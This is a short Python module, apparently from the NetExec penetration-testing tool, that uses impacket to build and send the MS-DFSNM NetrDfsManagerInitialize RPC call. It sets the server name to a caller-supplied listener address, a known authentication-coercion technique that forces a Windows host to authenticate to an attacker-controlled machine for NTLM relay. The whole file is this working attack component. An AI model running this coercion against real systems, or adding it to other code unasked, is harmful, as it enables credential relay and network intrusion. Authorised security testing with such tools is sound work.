from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError

class NetrDfsManagerInitialize(NDRCALL):
    """
    NET_API_STATUS NetrDfsManagerInitialize(
        [in, string] WCHAR* ServerName,
        [in] DWORD Flags
    );
    """
    opnum = 14
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("Flags", DWORD),  # Type: DWORD
    )


class NetrDfsManagerInitializeResponse(NDRCALL):
    structure = ()


def request(dce, listener):
    request = NetrDfsManagerInitialize()
    request["ServerName"] = f"{listener}\x00"
    request["Flags"] = 0  # Flags: This parameter MUST be zero.
    dce.request(request)